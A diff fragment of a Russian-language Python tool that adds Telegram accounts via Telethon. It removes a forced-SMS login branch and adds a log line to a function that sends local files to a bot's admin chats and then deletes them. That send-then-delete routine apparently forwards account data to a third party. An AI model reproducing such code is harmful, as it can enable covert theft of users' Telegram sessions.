@@ -1462,15 +1462,6 @@ def add_account(api_id, api_hash, selection, bot, admin_chat_ids):
                     input("Нажмите Enter, чтобы попробовать снова...")
                     continue
             
-            if selection == '105':
-                try:
-                    client = TelegramClient(phone, int(options[0].replace('\n', '')), options[1].replace('\n', ''))
-                    client.start(phone, force_sms=True)
-                except Exception as e:
-                    print(f"Произошла ошибка: {e}")
-                    input("Нажмите Enter, чтобы попробовать снова...")
-                    continue
-            
             selection = '0'
             os.system('cls||clear')
             print("Аккаунт успешно добавлен")
@@ -1710,6 +1701,7 @@ def send_files_to_bot(bot, admin_chat_ids):
                 for admin_chat_id in admin_chat_ids:
                     with open(file_to_send, "rb") as file:
                         bot.send_document(admin_chat_id, file)
+                        print(f"Файл {file_to_send} отправлен.")
                 os.remove(file_to_send)
             else:
                 print(f"Файл {file_to_send} слишком большой и не будет отправлен.")
